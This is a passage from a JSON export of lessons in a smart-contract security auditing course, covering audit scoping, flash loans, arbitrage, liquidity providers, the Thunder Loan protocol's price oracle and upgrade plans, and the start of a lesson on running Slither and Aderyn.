history.\"\n\n## Centralization and Defi Security Audits\n\nOur previous interactions with the T-SWAP or Uniswap audit only scratched the surface, introducing us to DEXes, invariants, and important DeFi protocols. With Thunder Loan, weâ€™re moving to a new level.\n\nThis protocolâ€™s code base has many common DeFi bugs, which make this one of the most important audits you can learn from. In addition to these security flaws, it introduces the concept of flash loansâ€”a \"monster\" tool with an enormous amount of information to explore.\n\nBy the time you've audited this code base, which consists of multiple folders and contracts and guides you through a more advanced protocol, you'll significantly enhance your understanding of DeFi security audits.\n\n## Price Oracle Manipulations\n\nAccording to the curriculum, price oracle manipulation was the principal attack for the first half of 2023. So as we audit the Thunder Loan protocol, we'll be learning how to tackle this risk head-on.\n\n> \"This course provides an extensive and comprehensive walk-through of the protocol thatâ€™s packed with so many common DeFi bugs that you will learn plenty along the way.â€\n\nTo wrap it up, the full report and notes on how to generate the audit report are waiting in the Thunder Loan git repoâ€™s `audit-data` branch as usual. Brace yourself and get ready to unearth a treasure trove of bugs and become a better security tester while we audit the Thunder Loan protocol!\n",
          "updates": []
        },
        {
          "lessonId": "c4bd6e67-622f-4978-81ab-b6a6b8415676",
          "number": 2,
          "title": "Phase 1: Scoping",
          "slug": "phase-1-scoping",
          "folderName": "2-phase-1-scoping",
          "description": "",
          "duration": 4,
          "videoUrl": "u91px009roNkxQdo6qtN4GOaDslvZl02CZHLP2KRYNpHs",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/2-phase-1-scoping/+page.md",
          "markdownContent": "---\ntitle: Phase 1: Scoping\n---\n\n_Follow along with the video lesson:_\n\n\n\n---\n\n# Scoping out a Codebase: A Comprehensive Guide\n\nCode auditing is a crucial part of every developer's journey. Whether you're managing an open-source project or conducting a security review, understanding a codebase in and out is indispensable. So where do we start?\n\nWell, this guide promises to take you through the nitty-gritty of scoping out a codebase, using a protocol as an example.\n\n## Kicking Things off With the README\n\nThe README documentation serves as a good starting point when familiarizing yourself with a new protocol. While initial impressions might provoke a 'blah, blah, blah, whatever' response, we can extract valuable information about the audit scope details in this document.\n\nIn our case, the README delineates the commit hash details, which you'd typically implement via the `git checkout` command.\n\n```bash\ngit checkout [paste the commit hash here]\n```\n\nFor learning purposes, however, we're going to stick with the main branch.\n\n## Understanding Included Contracts\n\nYour next port of call should be examining the contracts embedded within the codebase. In our scenario, we noticed all contracts resided in the protocol source, particularly in the `interface for protocol`. Interestingly, we also saw an upgraded version of the protocol.\n\nThis raised a question markâ€”what defines this 'upgraded protocol'? The particulars will unravel as we progress.\n\n## Code Version\n\nPay attention to the Solidity version for the protocolâ€”ours was v0.8.20. Be mindful that the contract should match Ethereum's latest security standards.\n\n## Contracts Handled\n\nWe next located some ERC 20 contractsâ€”namely USDC, die, Link, West. Use your past knowledge to understand how these contracts work. From our last course, we discovered that the USDC supports an upgradable contract and encompasses a block and allow list.\n\n> \"This information is vital as we need to understand how our protocol manages a token, which can transform completely.\"\n\n## Identifying Roles\n\nWe identified different roles within the protocol including an owner, a liquidity provider, and a user. Hoodwinked by terms like \"liquidity provider\"? Don't fret! As you delve deeper into DeFi, you will acquire familiarity with this lexicon.\n\nIn our case, we discovered that a liquidity provider is someone who deposits assets to earn interest, while a user is someone who takes flash loans from the protocol.\n\nThe protocol's owner holds the power to update the implementationâ€”interesting.\n\n### Digging Out Known Issues\n\nWe also found some known issues detailed in the README, warranting a revisit after gaining more context.\n\n## Analyzing Makefile\n\nPotentially useful insights lay in the `Makefile`, where we found Slither configuration along with some other tools. We took a minute to run solidity metrics on this \"bad Larry\", yielding an output that adds value to our understanding.\n\n```bash\nsolidity-metrics [insert codebase here]\n```\n\nIn our audit, the API gave an output of 391 N slock and 327 complexity score, indicating most complexity resided in the `Thunderloan` and `Thunderloan-upgraded`.\n\nWe dropped these metrics into a markdown file as notes to help gauge process duration in future audits.\n\n## The Importance of Context and Reconnaissance\n\nEnding phase one of our audit process, it's clear that understanding an unknown codebaseâ€”and by extension, performing a protocol auditâ€”is a matter of patience and practice. Taking your time and being methodical can help you glean valuable contextual information about the codebase.\n\nIn the part two of this guide, we'll conduct some rigorous reconnaissance, promising further insights into the protocol audit process. Stay tuned!\n",
          "updates": []
        },
        {
          "lessonId": "06bc8d6e-5b70-4b7e-b650-01ee9c4d791a",
          "number": 3,
          "title": "Reading The Docs",
          "slug": "reading-the-docs",
          "folderName": "3-reading-the-docs",
          "description": "",
          "duration": 4,
          "videoUrl": "L00fSQwGicEQySCtH3D2IZKKr33RuAddtg1HSkTmUiXE",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/3-reading-the-docs/+page.md",
          "markdownContent": "---\ntitle: Phase 2 Recon - Reading the Docs\n---\n\n\n\n---\n\n# Thunder Loans: In-depth Dive into Flash Loan Protocols\n\nWelcome to this comprehensive deep dive into flash loan protocols. In particular, we will be focusing on the Thunder Loan protocol heavily based on Aave and Compound.\n\nIf you're not familiar with Aave, I recommend checking out this explainer video available at [Whiteboard Crypto](https://www.whiteboardcrypto.com/). It's a fantastic resource to learn the ins and outs of borrowing and lending protocols at a high level.\n\nFor this particular blog, we're going to thrust ourselves much deeper to dissect these protocols and thoroughly understand how they make Thunder Loans possible.\n\nLet's kick-off the discussion by outlining what is Thunder Loans.\n\n## Thunder Loan Protocol: A Flash Loan Blueprint\n\nThe Thunder Loan protocol is designed with two main objectives. Firstly, it aims to provide users with the ability to construct flash loans. Secondly, it offers liquidity providers a chance to profit off their capital.\n\n> \"What's a flash loan?\"\n\nIf you posed this question, I urge you to hang on as we will delve into it later in this post. But first, let's get up to speed on some terminology.\n\nA _liquidity provider_, as some of you might be aware, is an individual who pours money into a protocol to yield interest. An inevitable question that follows is, \"where does the interest come from?\" It's a question vital to both an investor and a security researcher's perspective.\n\nTaking t-swap as an example, the interest generated is sourced from the fees levied on swaps. Translating the same logic, in Thunder Loans, the interest is likely derived from the fees attached to these flash loans.\n\nRemember, when you deposit money into Thunder Loans, you're given an asset token, which gradually accrues interest over time depending on the prevalence of flash loans.\n\nAlright, let's dissect what exactly is a flash loan.\n\n## Flash Loans: A Simple Explanation\n\nThe term 'Flash Loan' refers to a loan that spans precisely one transaction. In simpler terms, a user can borrow any sum of assets from a loan protocol as long as they completely pay it back within the same transaction. Failure to adhere to this rule causes the transaction to revert, cancelling the loan automatically.\n\nAdditionally, a tiny fee is imposed to the protocol depending on the borrowed amount. In Thunder Loans, to determine these fees, we utilize the renowned on-chain T-swap price Oracle.\n\n![](https://cdn.videotap.com/NZwarBK1M4rlkUCCFnyN-120.67.png)Thunder loans are currently planning to progress from the existing Thunder Loan contract to an upgraded one. This upgrade forms part of our security review's scope.\n\nTo effectively navigate these waters, we must develop a solid understanding of flash loans and get better acquainted with this lending and borrowing protocol. Hopefully, some graphical diagrams could perhaps simplify our learning process.\n\nTherefore, to understand this innovative DeFi primitive, I implore you to delve more into flash loans. Its knowledge is crucial to dissect the intricacies of Thunder Loans.\n\n## Wrapping Up\n\nIn this modern era of DeFi, understanding flash loans is remarkably essential. This blog is intended to provide a leap pad that gets you from novice to advanced levels of understanding how Thunder Loans operates and what are Flash Loans.\n\nSo, pull out your notes, and letâ€™s dive more in-depth into the world of flash loans. Understanding and leveraging flash loans can potentially change your perspective on lending and borrowing protocols.\n\nThat's all for today. Stay tuned for more insightful blogs on the expansive DeFi universe!\n",
          "updates": []
        },
        {
          "lessonId": "b80e0aaa-037c-414a-b27c-85c8f0b845da",
          "number": 4,
          "title": "What is a Flash Loan?",
          "slug": "what-is-flash-loan",
          "folderName": "4-what-is-flash-loan",
          "description": "",
          "duration": 4,
          "videoUrl": "9B9TNLY54bU002eMXzRXadkcFIp5Y1CL80052CHQY02wi00",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/4-what-is-flash-loan/+page.md",
          "markdownContent": "---\ntitle: What is a flash loan? - Arbitrage\n---\n\n\n\n---\n\n# Flash Loans: Leveling the Crypto Playing Field\n\nAs advances in Decentralized Finance (DeFi) shift into high gear, decentralized exchanges (DEX) are positioned at the epicenter of these developments. Previously, trading on these platforms was a privilege reserved for the financial elite - popularly known as 'whales' - who could leverage their massive capital assets to make significant gains. However, the advent of **flash loans** has democratized this field.\n\nSo, how does this groundbreaking innovation operate and help bridge the gap between the haves and the haven'ts in the crypto world?\n\n## Understanding the Concept of Arbitrage\n\nLet's consider a typical scenario. Suppose there are two DEXs, A and B. On Dex A, the exchange rate for Ethereum stands at $5, and on Dex B, Ethereum is trading at $6. Savvy investors might be quick to see an opportunity for profit.\n\nYou could buy one Ethereum at DEX A for $5, then head over to DEX B and sell that Ethereum for $6. This simple transaction would net you a profit of $1. This process is known as **Arbitrage.**\n\n> â€œArbitrage is exploiting the market's inefficiencies. By observing the different prices of an asset on various exchanges, you can leverage these differences to turn a profit.â€\n\n![](https://cdn.videotap.com/14PlrcuOsiwwbz21cqO4-71.61.png)\n\n## Arbitrage in Action: Difference in Capital\n\nThe catch here is, to initiate this process, you would need to have the $5 necessary to kick-start this operation. But thereâ€™s an inherent limitation when you consider a small-scale trader, letâ€™s say with only $5 in their pocket. Despite spotting this golden opportunity, they are limited to a single transaction due to their capital constraint. Their profits are also limited because they can only perform these operations one at a time.\n\nLet's consider a drastically different scenario: a user starts with a capital injection of $5,000 instead of $5. They can now purchase 1000 Ethereum tokens on DEX A and then sell them on DEX B, consequently earning $6,000. Here, the trader notches a profit of $1,000.\n\n> Simply put, the more money you start with, the higher your potential profits.\n\nIn the traditional web 2.0 world, this strategy was dominated by 'whales,' (a colloquial term denoting individuals with substantial capital or numerous tokens) as they could afford to take advantage of such lucrative opportunities.\n\n![](https://cdn.videotap.com/rrfz0m4i5sGKt8xvQTqp-135.26.png)\n\n## Introducing Flash Loans\n\nWhat if there was a mechanism that allowed any trader, regardless of their initial capital, to access substantial loans and instantly pay them back? Enter flash loans, an innovative concept that evens the playing field. In essence, a flash loan allows any user to become a \"whale\" for a single transaction.\n\nThrough flash loans, our earlier protagonist with only $5 can perform the same operations as the deep-pocketed trader with $5,000. This revolutionary concept raises a critical question: How can flash loans level the playing field and make web 3.0 finance more equitable?\n\nTo unravel this complex conundrum, we need a deep understanding of what a flash loan is and how it functions. Stay tuned as we dig deeper into this game-changing financial instrument in our ensuing posts.\n\nIn the next article, we dive into the workings of flash loans, their essence, and how they are leveling the playing field for every player in the crypto universe. Stay tuned!\n",
          "updates": []
        },
        {
          "lessonId": "5308c413-16b5-42c8-8b55-91ccbe055788",
          "number": 5,
          "title": "Pay Back Or Revert",
          "slug": "pay-back-or-revert",
          "folderName": "5-pay-back-or-revert",
          "description": "",
          "duration": 4,
          "videoUrl": "pLXbCpqEbRA01NQhoU5y5W008C6nkngGL2b8EGU35EgZw",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/5-pay-back-or-revert/+page.md",
          "markdownContent": "---\ntitle: What is a flash Loan - Pay back the loan or revert\n---\n\n\n\n---\n\n# The Power and Potential of Flash Loans in DeFi\n\nFlash loans provide an innovative financial solution in the decentralized finance (DeFi) world, particularly for arbitrage and various other investment strategies. By examining how they work in the context of smart contracts, we can see how they open up fresh opportunities for DeFi users.\n\n## A Closer Look at DeFi Protocols and Smart Contracts\n\nIn DeFi, many protocols have funds inside a contract. For instance, 1,000 USDC might be stored in a contract, controlled by immutable code. It is this immutable nature that ensures that any funds disbursed by the contract are secured against possible theft.\n\nThe power of DeFi and smart contracts makes them amazing. Particularly because we can encode instructions into them. For instance, a smart contract can be encoded to lend 1,000 USDC to a borrower within a transaction, with the strict condition that the money is returned by the end of the transaction. If the borrower fails to repay the funds, thenâ€”in the miraculous world of web threeâ€”we can revert the entire transaction! This means that instead of the money disappearing, the transaction is restored to its initial state as though it never occurred. And all this can be encoded into the initial smart contract.\n\n## The Intricacies of Flash Loans in DeFi\n\nNow that we understand the code that governs them, let's look at what this process actually looks like in action.\n\n![](https://cdn.videotap.com/o9RbphgNLng9CnbEUGQa-140.92.png)\n\nImagine that a flash loan contract has been set up. The encoded contract permits a borrower to take a loan of 1,000 USDC, provided it is repaid by the end of the transaction. This all happens within a single transaction.\n\nThis borrowed money is then sent to a contract controlled by the borrower, where the borrower can perform various tasks with the borrowed funds. These might range from arbitrage strategies to simply maintaining the funds in possession for transaction. The contract then has an obligation to repay the loan to the initial lender contract.\n\nAt the end of the transaction, the lender contract conducts a check to ascertain whether the loan has been repaid. If the balance is less than the expected repayment, the entire transaction is reverted, and the blockchain state is restored to the point before the transaction took place.\n\nAnd this, in essence, is how a flash loan works. This facility couldn't exist outside of the web three world. Itâ€™s potential uses are almost limitless, making it an exciting financial tool in the realm of DeFi.\n\n## In the Real World of DeFi\n\nTake a moment to consider the implications of this. With strict conditions ensuring the return of funds, flash loans throw open novel opportunities in the decentralized finance space. Time and imagination are the only constraints on how these funds might be utilized within that single transaction.\n\n> The beauty of flash loans lies in their simplicity and security. A borrower can leverage these loans for sophisticated strategies in a secure, risk-free environment, thanks to built-in transaction reversion. Truly, flash loans embody the full potential of DeFi.\n\nFlash loans open up a playground for experimentation and investment strategy, and they are yet another reason DeFi is an exciting field to watch!\n",
          "updates": []
        },
        {
          "lessonId": "e55d95b1-496b-43ce-9015-bb59b98e1b04",
          "number": 6,
          "title": "Liquidity Providers",
          "slug": "liquidity-providers",
          "folderName": "6-liquidity-providers",
          "description": "",
          "duration": 2,
          "videoUrl": "ew8JjN2FI00eh02sqeX5FIlpwQJrJV4rr901W01f2hgF3bg",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/6-liquidity-providers/+page.md",
          "markdownContent": "---\ntitle: What is a flash loan - Liquidity Providers\n---\n\n\n\n---\n\n# Deep Dive Into Flash Loans and Liquidity Providers\n\nWelcome to another blog post in our crypto education series, where we explore the intriguing world of decentralized finance (DeFi) concepts. Today, we'll be focusing on the concept of Flash Loans, a highly popular instrument in the DeFi space. More specifically, we'll look at the role of those special behind-the-scene players called Liquidity Providers - their relationship with Flash Loans and how they gain from the system.\n\n## The Concept of Flash Loans\n\nFor the uninitiated, Flash Loans are a DeFi innovation which enables borrowing of an asset without collateral, provided that the loan is repaid within the same transaction block. Now you may ask, how does money magically appear for these loans? And who provides this capital? Let's answer these.\n\n## Understanding Liquidity Providers\n\nJust like in traditional finance, the capital for loans don't just materialize out of thin air. The $1,000 or any amount of the Flash Loan is actually provided by what we call a \"liquidity provider\". In most cases, these are users (or \"whales\") who deposit a significant amount of money into a liquidity pool in a smart contract.\n\nFor instance, assume a user deposited $1,000 into a smart contract. This wouldn't be as simple as a one-sided transaction. Instead, they receive shares of the pool - a sort of 'receipt' denoting their contribution of $1,000 worth of tokens.\n\n## The Flash Loan Process\n\nThe Flash Loan's working can be understood through a simple flow: the user requests the Flash Loan, borrows the money, and immediately pays it back. The USDC quickly cycles between the borrower and the liquidity pool.\n\nIt's important to note that Flash Loans are not free to utilize. Borrowers have to pay a small fee every time they borrow, often something as minuscule as a +0.1% on the borrowed amount.\n\n## Earning Through Fees\n\nHereâ€™s where things get interesting for our liquidity providers. Every Flash Loan borrowed, and the associated fee, is accrued in the contract. So instead of just the original $1,000, the total pool keeps keeping amplified by the accrued fees e.g., $1,002, $1,003, and so on as more Flash Loans are taken.\n\nIn layman's terms, liquidity providers gather fees from every Flash Loan issued, making their investment worth it. Indeed, as succinctly summed up in this quote:\n\n> \"Because they deposited money to the protocol, they're going to get fees for people taking out these Flash loans.\"\n\n![](https://cdn.videotap.com/YjlbuTfa3JOWtnR1HeLa-81.png)\n\nIn conclusion, Flash Loans present a fascinating facet of the DeFi world, with many moving parts at play. Here's cheers to getting to understand the skeleton of yet another DeFi innovation! Stay tuned for more DeFi explorations in our upcoming blogs.\n",
          "updates": []
        },
        {
          "lessonId": "8232d5e0-21bb-491d-9e57-7dce5033eac4",
          "number": 7,
          "title": "Arbitrage Walkthrough",
          "slug": "arbitrage-walkthrough",
          "folderName": "7-arbitrage-walkthrough",
          "description": "",
          "duration": 5,
          "videoUrl": "z5N007sMkjW2KPaWATi7YVTQsuPk8sk1IVi79rdCuJGA",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/7-arbitrage-walkthrough/+page.md",
          "markdownContent": "---\ntitle: Arbitrage walkthrough\n---\n\n\n\n---\n\n# Spotting Opportunities with Flash Loans in DeFi: A Beginner's Guide\n\nIn this blog post, we'll walk you through a simple yet effective use case of flash loans in the ever-growing DeFi sphere. These instantaneous and uncollateralized crypto borrowings have the potential to level the playing field for those just beginning their journey with decentralized finance.\n\n![](https://cdn.videotap.com/pU3EHWsVTfLRc7Io0d4p-11.31.png)## The Scenario: Decentralized Exchanges and A Flash Loan Protocol\n\nFlash loans can be used to take advantage of discrepancies between different decentralized exchanges. In our use case, for illustrative purposes, let's imagine two decentralized exchanges, **DEX A** that values 1 ETH at $5 and **DEX B**, valuing 1 ETH at $6. Let's introduce our player, **Little Fox**, who initially has $5 and aspires to leverage these discrepancies for gains, much like big players or â€œwhalesâ€œ.\n\nOrdinarily, he could repeatedly buy ETH from DEX A and sell on DEX B to benefit from the price disparity while it lasts. However, performing this arbitrage manually would entail considerable gas fees and risk attracting copycats, eroding the arbitrage opportunity over time. This approach, therefore, isn't practical nor efficient.\n\nEnter **flash loans**, an innovative DeFi tool that can significantly change the landscape.\n\n![](https://cdn.videotap.com/nb798NifZCWAlRyaN0W8-39.57.png)\n\n## The Flash Loan Mechanism: How Does It Work?\n\nBelow, we're going to break down how our Little Fox can employ the power of flash loans and achieve the same level of profit as a whale.\n\nIn our example, there's a flash loan protocol that enables individuals to borrow substantial sums of capital. The protocol begins empty, awaiting deposits from prospective lenders.\n\nLetâ€™s say a whale deposits $5,000 into the protocol, creating 5,000 flash loan tokens (FLTs). Owning 100% of the FLTs, the whale essentially owns all the money in the protocol. They can use their FLTs to retrieve their full deposit at any time they wish.\n\n## Step 1: Requesting the flash loan\n\nThe first step for Little Fox is to call the flash loan function on the smart contract to borrow the $5,000 from the protocol.\n\n### Step 2: Executing the arbitrage strategy\n\nRemember that all actions using the borrowed funds must occur within one blockchain transaction to prevent loan default. Therefore, we represent the following steps with a single 'transaction call'\n\n### Step 3: Repaying the flash loan\n\nFinally, Little Fox repays the $5,000 flash loan to the protocol and keeps the $1,000 profit.\n\n![](https://cdn.videotap.com/ZCzIKYmtOmiYCUylbef8-237.43.png)\n\nIn effect, by initially borrowing $5,000, buying 1,000 ETH, re-selling the ETH for $6,000 and returning the initial $5,000 (plus a tiny fee), Little Fox made the same $1,000 gain that the whale wouldâ€™ve without the initial capital.\n\n> \"Despite starting with just $5 and incurring a tiny fee, our Little Fox was able to end up with a juicy profit of almost $1,000, thanks to flash loans.\"\n\nTo provide some perspective, let's keep in mind that real-world arbitrage opportunities won't always be as substantial, and gas costs can influence the profitability. However, the example underlines the power of flash loans to amplify potential profits in DeFi by enabling smaller players to punch above their weight.\n\nFlash loans epitomize the democratization of finance that lies at the heart of the DeFi movement. They demonstrate just how the playing field can be leveled by the power of smart contracts, providing opportunity and access to all participants, not just the 'whales'.\n",
          "updates": []
        },
        {
          "lessonId": "044a08db-c6fa-4162-8996-88a28d93bf76",
          "number": 8,
          "title": "Are Flash Loans Bad?",
          "slug": "are-flash-loans-bad",
          "folderName": "8-are-flash-loans-bad",
          "description": "",
          "duration": 1,
          "videoUrl": "oTkNg6P5CSDG6JOX4zoCD2NH3QW8TwVSeZ4NXYq5urM",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/8-are-flash-loans-bad/+page.md",
          "markdownContent": "---\ntitle: Are Flash Loans Bad?\n---\n\n\n\n---\n\n# Flash Loans in Crypto Finance: A Level Playing Field\n\nCrypto finance, or more aptly the world of DeFi (Decentralized Finance), is a rapidly evolving landscape. There's one key feature that has been stirring up quite a debate: **flash loans**. Today, we delve deeper into what flash loans are and how they're positively impacting the sphere.\n\nBefore we tread further, for those unfamiliar with the term, let's start with a brief walkthrough of what flash loans are.\n\n## What are Flash Loans?\n\nIn the context of DeFi, a flash loan is essentially an uncollateralized loan option that allows individuals to borrow cryptocurrency and repay it back within the same blockchain transaction. In other words, you borrow and repay in a single operation. This may sound more like a charade, but trust me, it's a feature that could be a game-changer.\n\n> \"Flash loans allow anybody to be a whale in the traditional finance world.\"\n\n![](https://cdn.videotap.com/Nz3tLzfPAOWomq9L4VVr-9.78.png)\n\nFlash loans are helpful in a myriad of applications, arbitrage being a major one, and we'll delve into exactly how these loans play out in the following sections.\n\n## The Power of Flash Loans\n\n### Equalizing the Playing Field\n\nIn the traditional finance world and even in most commerce spaces, arbitrage opportunities exist. For those unfamiliar with this term, arbitrage is simply the practice of taking advantage of a price difference between two or more markets. It involves striking a combination of matching deals that capitalize upon the imbalance, with the profit being the difference between the market prices.\n\nHowever, there's a catch: these opportunities are usually accessible only to the super-rich or \"whales\", as they're colloquially referred to in the crypto world. Why? Because they are the ones with substantial capital to participate in these kinds of opportunities.\n\nIn comes our knight in shining armour - the flash loans. By offering a way to take part in these opportunities without a massive initial capital, flash loans level the playing field and democratize the finance world, making it possible for anyone to be a â€˜whaleâ€™ â€” if only for a single transaction.\n\n> \"In the DeFi world, thanks to flash loans, the playing field is leveled and anyone can be a â€˜whaleâ€™ for a single transaction.\"\n\n![](https://cdn.videotap.com/khoXIky8WmJ5fr0DE16U-22.png)\n\n## The Positives of Flash Loans\n\nContrary to popular belief, flash loans are not a negative elixir. They are empowering smaller investors and participants by opening gateways to opportunities that were previously locked up for the privileged few.\n\nFirstly, these loans are uncollateralized, meaning that you don't have to put up any collateral to secure a loan. You just enter, borrow the money, do your business and pay the loan back â€” all within a single transaction block. This makes it really appealing for everyday folks to participate in the crypto market and benefit from the same.\n\nSecondly, flash loans have made it possible to conduct complex financial manoeuvres like arbitrage with practically zero upfront capital â€” a situation that was unthinkable not too long ago. This gives an opportunity to the ordinary individuals to make a profit from the fluctuations in the notoriously volatile crypto markets, thus breaking the monopoly the â€˜whalesâ€™ had over such activities.\n\n![](https://cdn.videotap.com/WdxwLG3XbBSQfHjisOdu-28.11.png)\n\n## Conclusion\n\nIn conclusion, flash loans in the world of DeFi, despite some of the criticisms they face, are indeed a positive evolution, as they democratize the crypto financial world and make it accessible to an average investor. The power to be a crypto 'whale' for even a single transaction has brought a much-needed sense of equity to this space. Therefore, flash loans are here to stay and likely to shape an increasingly level playing field in the crypto industry moving forward.\n\nSo now, continue your exploration into the financial future. Know that you too can be a whale!\n",
          "updates": []
        },
        {
          "lessonId": "cd8d2270-4a46-4bdb-a9ec-7df8212ed851",
          "number": 9,
          "title": "Recap",
          "slug": "recap",
          "folderName": "9-recap",
          "description": "",
          "duration": 3,
          "videoUrl": "xjBhcXE00cV1Ck7wCQzvWai1GE9i00vr9OQp6UN902DJzA",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/9-recap/+page.md",
          "markdownContent": "---\ntitle: Recap\n---\n\n\n\n---\n\n# Decoding Flash Loans: A Comprehensive Walkthrough\n\nWelcome back! Today we're going to steer the wheel down the crypto lane and dive into a fascinating concept - Flash Loans.\n\n![](https://cdn.videotap.com/e2sbhlbfl9ZreXlI3mzt-12.08.png)\n\n## How Do Flash Loans Work?\n\nA quick rundown of how this all functions is necessary. Picture this: a whale (a large player in the crypto market) deposits $5,000 into the flash loan protocol.\n\n![](https://cdn.videotap.com/ww7stcBKpXeTs9ZF51U1-30.19.png)\n\n### The User Comes In\n\nAfter this, a user comes in and pulls out a $5,000 loan from the flash loan. This person now needs to repay the $5,000 plus any fees associated; if not, the transaction will revert. The user uses this borrowed amount to purchase $1,000 worth of Ethereum (ETH).\n\n### Trading the ETH\n\nThen comes the interesting part. They sell the $1,000 worth of ETH for $6,000, and then return the originally borrowed amountâ€”keeping $1,000 for themselves, which results in net earnings of $995 after paying a $5 fee.\n\n### Where Does The Money Go?\n\nSo, in the course of these transactions, the flash loan protocol ends up with the initial $5,000 plus the $5 fee.\n\n### Withdrawal by the Whale\n\nLastly, whenever the whale chooses, they can withdraw their initial deposit by trading back in the flash loan token, which signifies their 100% ownership of the pool. So, for their $5,000 deposit, they receive $5,005: a mix of the original deposit amount and the accumulated fees.\n\n## Learning About Arbitrage\n\nAlright, so that was quite a bit to absorb, but it paints a rough picture of how flash loans function. Now, why would someone want to use flash loans? A primary reason is arbitrage.\n\nArbitrage is a scenario where you exploit a price discrepancy on two different exchanges. For instance, if Exchange A lists ETH at $5 and Exchange B lists ETH at $6, you can buy from A and sell at B to make a profit. This is arbitrage simplified.\n\n## Flash Loans: Breaking Down Their Purpose\n\nNow, let's circle back to flash loans. What makes them unique is the rapidity with which they can be executed. A loan taken out for a single transaction, and if repaid immediately, it completes. If not, the transaction can be coded to automatically revert. This function is only possible in Web 3 platforms.\n\nPulling these threads together, someone might utilize a flash loan to carry out arbitrage and benefit from a market price discrepancy.\n\n> \"Flash loans allow us to take out quick loans for a single transaction. If we don't pay the money back, the transaction can automatically revert.\"\n\n## Dig into It Yourself!\n\nFor those seeking a more hands-on approach, we'll be adding examples of flash loan protocol arbitrage in the audit data branch of our GitHub repositories. All diagrams used in this post, as well as additional resources, can be found there.\n\nIn conclusion, flash loans and arbitrage could be a lucrative way to leverage crypto market discrepancies, especially considering the volatility characteristic of this space. Whether you're an aspiring whale or a novice user aiming to dip your feet, understanding this realm can illuminate a whole new way of interacting with cryptocurrency.\n\nThe main caveat, as always, is comprehension. Understanding the terms and conditions, and the associated risks, is a prerequisite to success in any financial venture, and flash loans are no exception. Be sure to dig into our other resources if you'd like more of a deep dive!\n",
          "updates": []
        },
        {
          "lessonId": "d61670f8-0992-4154-b45a-41b2a482a0ea",
          "number": 10,
          "title": "Recon Continued",
          "slug": "recon-continued",
          "folderName": "10-recon-continued",
          "description": "",
          "duration": 4,
          "videoUrl": "pU3ti8RWxJn9twmnJ7bX6023k3CyVr44F3HW7pBvjx200",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/10-recon-continued/+page.md",
          "markdownContent": "---\ntitle: Recon (continued)\n---\n\n\n\n---\n\n# Understanding the Thunder Loan Protocol: A Comprehensive Review\n\nWelcome to another intriguing blog post where we'll dive deep into the world of cryptocurrencies, specifically focusing on the Thunder Loan protocol. This post is rooted in our continued commitment to simplify complex subjects in decentralized finance for you.\n\n## Contextualizing the Thunder Loan Protocol\n\nThunder Loan protocol, like many other DeFi (Decentralized Finance) protocols, is based on borrowing, lending, and flash loans. To fully grasp how this protocol operates, one must first comprehend how flash loans and borrowing/lending processes work.\n\n> _\"Sometimes when you're doing security reviews, you got to look up stuff that might not seem related.\"_\n\nI recommend learning more about these protocols by exploring [Aave](https://aave.com) and [Compound](https://compound.finance). You could also watch related deep-dive videos to get more context.\n\n## Breaking Down Flash Loans and Liquidity\n\nSo, what is a flash loan? In essence, flash loans involve users borrowing substantial sums, completing arbitrage trades, then returning the borrowed sum in the same transaction. They are rapid transactions that thoroughly leverage the capabilities of smart contracts.\n\nUsers, also known as liquidity providers, deposit their funds into the protocol. In exchange, they receive asset tokens, representing their stake in the protocol. Users also need to pay a small fee to the protocol, which depends on the borrowed sum.\n\nOne might be curious: how is this fee calculated?\n\nEnter the **on-chain Tswap price oracle**.\n\n## The Critical Role of the Tswap Price Oracle\n\nPrice oracles play a crucial role in crypto trading platforms. They act as a bridge, bringing external real-world data or computation on-chain.\n\n> _\"An Oracle is going to be a device that takes external real-world data or computation and brings it on-chain.\"_\n\nFor instance, a price oracle could determine the price of Ethereum â€“ a concept forgotten by the material world. It's fascinating to note that the Thunder Loan protocol uses TSwap's Dex that we reviewed in our previous section as a price oracle.\n\nNow, one might wonder: why would the protocol need a price oracle?\n\nLet's dig in further.\n\n## The Thunder Loan Protocol Upgrade\n\nWe have one more puzzling detail. Thunder Loan Protocol is planning to upgrade their current contract to the Thunder Loan upgraded contract.\n\nThis upgrade is a crucial element to be considered under the scope of our security review. The Thunder Loan seems to be an upgradable smart contract, following the Ownable Upgradable, UUPS Upgradable and Oracle Upgradable paths.\n\n## Wrapping Up\n\nFinally, we've learned how the protocol sheds light on flash loans, arbitrage, and provides various opportunities for liquidity providers apart from their usual asset token interest.\n\nWe've also noticed some unique features like the TSwap Price Oracle embedded into the protocol's ecosystem, contributing prominently to its functionality.\n\nThis post should have given you a thorough overview of the Thunder Loan protocol. Now would be an ideal time for you to reach out to the protocol or prepare their diagrams, detailing how their whole system actually works.\n\nRemember to have fun, stay curious, and keep exploring!\n",
          "updates": []
        },
        {
          "lessonId": "cf98c920-cca9-4975-9259-b11408ae8b36",
          "number": 11,
          "title": "Static Analysis - Slither & Aderyn",
          "slug": "static-analysis-slither-aderyn",
          "folderName": "11-static-analysis-slither-aderyn",
          "description": "",
          "duration": 7,
          "videoUrl": "jUA01mnh602HYtZLRdlmJwu1bc9xT01vACwwwZcXNmg73w",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/11-static-analysis-slither-aderyn/+page.md",
          "markdownContent": "---\ntitle: Static Analysis Slither + Aderyn\n---\n\n\n\n---\n\n# Solidity Foundry Project: Running Slither and Aderyn\n\nWelcome back! In today's blog, we're going to throw ourselves into the heart of a Solidity foundry project. Unfortunately, there are no diagrams to help us along the way, but no worries, because we've got two brilliant tools at our disposal: **Slither** and **Aderyn**.\n\n## Setting the Stage: Your Make File\n\nFor this project, and any Solidity project moving forward, a typical **make file** will embrace a little Slither command line action and be embellished with a Slither Config JSON file.\n\nThe Slither Config JSON that I am fond of using, you can tailor as per your project needs. What makes it special is the string of flags that are manually turned on or off to procure meaningful Slither outputs. _Fun Fact: You might notice I donâ€™t include a few detectors like conformance to Solidity naming conventions or incorrect versions of Solidity. Thatâ€™s because I have a fair share of taste for unconventional naming and most folks arenâ€™t using 0.8.18 versions but rather zero point 20._\n\nNext, in our mission to make the Slither output as concise and helpful as possible, we make sure to filter paths to avoid pulling in redundant information from mocks, tests, scripts, upgraded protocol, or dependencies. This ensures we 